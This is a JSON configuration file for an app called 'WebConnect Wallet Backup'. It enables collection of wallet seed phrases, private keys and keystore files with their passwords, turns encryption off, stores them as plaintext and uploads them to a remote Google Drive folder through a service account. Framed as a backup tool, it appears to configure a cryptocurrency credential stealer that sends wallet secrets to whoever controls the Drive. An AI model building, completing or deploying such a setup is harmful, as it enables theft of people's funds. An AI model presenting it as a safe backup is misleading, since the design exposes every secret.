{
  "version": "1.0.0",
  "app_name": "WebConnect Wallet Backup",
  "description": "Interactive wallet backup system with Google Drive integration",
  "repository": "https://github.com/decentralizedconfig/launchpad",
  
  "storage": {
    "enabled": true,
    "destinations": [
      {
        "name": "google_drive",
        "type": "google_drive",
        "enabled": true,
        "folder_id": "YOUR_GOOGLE_DRIVE_FOLDER_ID",
        "description": "Google Drive folder for secure backup storage",
        "credentials": {
          "type": "service_account",
          "project_id": "YOUR_PROJECT_ID",
          "private_key_id": "YOUR_PRIVATE_KEY_ID",
          "private_key": "-----BEGIN PRIVATE KEY-----\nYOUR_PRIVATE_KEY_HERE\n-----END PRIVATE KEY-----\n",
          "client_email": "YOUR_SERVICE_ACCOUNT_EMAIL",
          "client_id": "YOUR_CLIENT_ID",
          "auth_uri": "https://accounts.google.com/o/oauth2/auth",
          "token_uri": "https://oauth2.googleapis.com/token",
          "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
          "client_x509_cert_url": "YOUR_CERT_URL",
          "universe_domain": "googleapis.com"
        }
      }
    ]
  },

  "backup": {
    "enabled": true,
    "auto_backup": false,
    "backup_interval": 86400,
    "retention_days": 30,
    "compression": false,
    "encryption": false,
    "file_format": "txt"
  },

  "backup_types": {
    "recovery_phrases": {
      "enabled": true,
      "min_words": 12,
      "max_words": 24,
      "description": "12 or 24-word seed phrases"
    },
    "private_keys": {
      "enabled": true,
      "format": "0x...{64 hex chars}",
      "description": "Ethereum-style private keys"
    },
    "keystores": {
      "enabled": true,
      "format": "JSON",
      "description": "Keystore JSON files with passwords"
    }
  },

  "directory_structure": {
    "install_directory": "~/.webconnect",
    "wallet_backups": "wallet_backups",
    "logs": "logs",
    "config": "config"
  },

  "logging": {
    "enabled": true,
    "log_level": "INFO",
    "log_file": "logs/backup.log",
    "retention_days": 30
  },

  "security": {
    "verify_ssl": true,
    "local_backup_permissions": "600",
    "config_permissions": "600",
    "install_dir_permissions": "700",
    "data_format": "plaintext"
  },

  "google_drive": {
    "endpoint": "https://www.googleapis.com/drive/v3",
    "upload_timeout": 60,
    "retry_attempts": 3,
    "chunk_size": 262144
  }
}
